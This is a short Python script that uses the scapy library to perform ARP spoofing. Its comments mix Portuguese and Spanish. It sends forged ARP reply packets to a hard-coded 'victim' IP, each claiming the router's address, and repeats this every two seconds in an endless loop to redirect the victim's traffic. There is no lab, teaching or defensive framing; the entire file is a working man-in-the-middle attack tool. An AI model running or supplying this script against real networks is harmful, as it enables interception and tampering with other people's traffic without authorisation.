from scapy.all import ARP, send
import time

def arp_spoof(target_ip, spoof_ip):
    # Envia fake ARP pro trafico de redirect
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",  psrc=spoof_ip)
    send(packet, verbose=False)

target_ip = "254.19.108.100" # Victima IP
spoof_ip = "254.19.1.1" # IP router

print("[*] Starting ARP spoofing. . .")
while True:
    arp_spoof(target_ip, spoof_ip)
    time.sleep(2) # Envia packets a cada 2 segundos
 